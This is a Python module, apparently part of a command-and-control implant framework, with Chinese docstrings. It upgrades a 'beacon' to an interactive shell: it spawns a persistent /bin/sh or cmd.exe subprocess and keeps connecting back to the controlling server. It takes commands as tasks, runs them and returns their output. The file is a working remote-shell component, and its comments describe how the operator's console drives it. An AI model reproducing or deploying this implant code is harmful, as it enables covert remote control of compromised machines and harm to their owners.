"""shell — 升级为交互式 shell（持久 /bin/sh 子进程，命令状态保留）。

执行后 beacon 启动一个长驻 /bin/sh 子进程（_SH），进入持续回连循环：
  连接 → register(shell=True) → 循环收任务 → 任务文本作为 shell 命令
  写入子进程 stdin 执行 → 回传输出（命令后附加结束标记截取）→
  队列空 pong → 断开重连。

所有命令在同一个子进程里执行，状态天然保留：
  切换目录（cd）、环境变量、umask 等在后续命令中持续生效。

退出：
  - 收到文本 "exit" 或 "break" 的任务 → 退出 shell 循环，退回基础 beacon
  - 退出时终止子进程，_SH 复位为 None
  - 基础循环注册不带 shell 标记 → server 端 is_shell 自动复位

console 用法（shell 激活后）：
  - 直接输入命令（ls -la / cd /tmp / whoami）→ dispatcher 自动转 shell 命令
  - 管理命令（use / show / beacon / result ...）仍正常
  - exit / break → 退出 shell（不退出 console）

依赖 beacon 全局（D2 短名契约）: _T/_D/g/p/q/s/f/_BS/_IN_SHELL/_SH
"""

import subprocess as _sp

MODULE = {
    "desc": "升级为交互式 shell（持久子进程，命令状态保留，break/exit 退出）",
    "params": [],
}

_END_MARK = "__PYEXEC_END_"


def _start_shell():
    """启动持久 shell 子进程（管道 stdin/stdout）。

    Windows 用 cmd.exe，其他平台用 /bin/sh。
    设置 _SHELL_WIN 供 _sh_exec 选择结束标记语法。
    """
    import os
    G = globals()
    if os.name == "nt":
        G["_SHELL_WIN"] = True
        return _sp.Popen(["cmd.exe"], stdin=_sp.PIPE, stdout=_sp.PIPE,
                         stderr=_sp.STDOUT, text=True, bufsize=1)
    G["_SHELL_WIN"] = False
    return _sp.Popen(["/bin/sh"], stdin=_sp.PIPE, stdout=_sp.PIPE,
                     stderr=_sp.STDOUT, text=True, bufsize=1)


import queue as _q
import threading as _th
import time as _tm

# 模块级单 reader（M5 修复的坑：每命令新开 reader 会与遗留 reader
# 竞争读同一管道，marker 行被抢 → 永久卡死）
_LINES_Q = _q.Queue()     # (seq, line) 元组
_READER_SH = None         # 当前 reader 绑定的子进程
_READER_SEQ = 0           # 单调递增序号


def _ensure_reader(sh):
    """确保有一个 reader 线程在读 sh 的 stdout（绑定同一进程只开一个）。"""
    G = globals()
    if G.get("_READER_SH") is sh:
        return
    G["_READER_SH"] = sh

    def _reader():
        while True:
            line = sh.stdout.readline()
            if not line:
                G["_LINES_Q"].put((G["_READER_SEQ"] + 1, None))
                break
            G["_READER_SEQ"] += 1
            G["_LINES_Q"].put((G["_READER_SEQ"], line))

    _th.Thread(target=_reader, daemon=True).start()


def _sh_exec(cmd):
    """在持久子进程里执行一条 shell 命令，返回 (output, error)。

    命令后追加结束标记（sh: echo __PYEXEC_END_$? / cmd: echo
    __PYEXEC_END_，%errorlevel% 在 cmd 管道/非交互模式下不可靠），
    读到标记行即认为该命令输出结束（同一子进程继续存活，状态保留）。

    M5：读输出走持久 reader 线程 + 超时（120s）——前台长命令（sleep
    1000）不再永久卡死 beacon；超时后标记 shell 失效要求重建。
    """
    G = globals()
    sh = G.get("_SH")
    if sh is None or sh.poll() is not None:
        return "", "(shell 子进程不可用，请重新执行 shell 模块)"
    if G.get("_SHELL_WIN"):
        marker = "echo " + _END_MARK          # cmd：固定标记，不带退出码
    else:
        marker = "echo " + _END_MARK + "$?"   # sh：带退出码
    # 边界序号必须在写入前捕获：reader 可能已把上一命令的
    # 输出（含 marker）读完，写后再取会把这些行全部跳过（竞态）
    _ensure_reader(sh)
    start_seq = G["_READER_SEQ"]
    try:
        sh.stdin.write(cmd + "\n" + marker + "\n")
        sh.stdin.flush()
    except (BrokenPipeError, OSError) as e:
        return "", f"(shell pipe error: {e})"

    out = []
    deadline = _tm.time() + 120
    while True:
        try:
            seq, line = G["_LINES_Q"].get(timeout=1.0)
        except _q.Empty:
            if _tm.time() > deadline:
                # 命令未在期限内返回：标记 shell 失效（旧 reader 线程
                # 仍在读管道，复用会串扰），要求重建
                G["_SH"] = None
                return "".join(out), ("(命令超时未返回 120s，shell 已失效，"
                                      "请重新执行 shell 模块)")
            continue
        if seq <= start_seq:
            continue  # 上一条命令的残留输出，跳过
        if line is None:
            break  # 子进程退出
        s = line.rstrip("\r\n")
        if s.startswith(_END_MARK):
            code = s[len(_END_MARK):]
            err = "" if code in ("", "0") else f"(exit {code})"
            return "".join(out), err
        out.append(line)
    return "".join(out), "(shell closed)"


def run():
    """进入交互式 shell 循环，直到收到 exit/break 文本任务。"""
    G = globals()
    G["_BS"] = False
    G["_IN_SHELL"] = True
    try:
        try:
            G["_SH"] = _start_shell()
        except Exception as e:
            return f"(shell 启动失败: {e})"
        while not G["_BS"]:
            try:
                t = _T()
                p(t, g.dumps({"type": "register", "version": 1,
                              "role": "beacon", "id": _D,
                              "shell": True}).encode())
                while not G["_BS"]:
                    u = g.loads(q(t).decode())
                    v = u.get("type")
                    if v == "welcome":
                        continue
                    if v in ("task", "init_task"):
                        cmd = u["code"].strip()
                        if cmd in ("exit", "break"):
                            G["_BS"] = True
                            p(t, g.dumps({"type": "result",
                                          "task_id": u.get("task_id", ""),
                                          "output": "(shell exit)",
                                          "error": ""}).encode())
                            break
                        # 幂等：server 断线重发机制可能把 shell 任务本身
                        # 重发回来（主连接执行 shell 时阻塞，server 等
                        # result 超时 → push_front 重发）。已在 shell 模式
                        # 时跳过，防止嵌套 shell 循环互相覆盖 _BS。
                        if ("def _sh_exec" in u["code"]
                                or "def _start_shell" in u["code"]):
                            p(t, g.dumps({"type": "result",
                                          "task_id": u.get("task_id", ""),
                                          "output": "(已在 shell 模式，"
                                                    "忽略重复的 shell 任务)",
                                          "error": ""}).encode())
                            continue
                        w, x = _sh_exec(cmd)
                        p(t, g.dumps({"type": "result",
                                      "task_id": u.get("task_id", ""),
                                      "output": w, "error": x}).encode())
                    elif v == "pong":
                        break
                    elif v == "error":
                        break
                t.close()
            except Exception:
                pass
            if not G["_BS"]:
                f.sleep(s())
    finally:
        G["_IN_SHELL"] = False
        sh = G.get("_SH")
        if sh is not None:
            try:
                sh.kill()
            except Exception:
                pass
            G["_SH"] = None
    return "(shell 已退出，退回基础 beacon 循环)"


if __name__ == "__main__":
    print("shell: 由 server 下发执行，不直接运行")
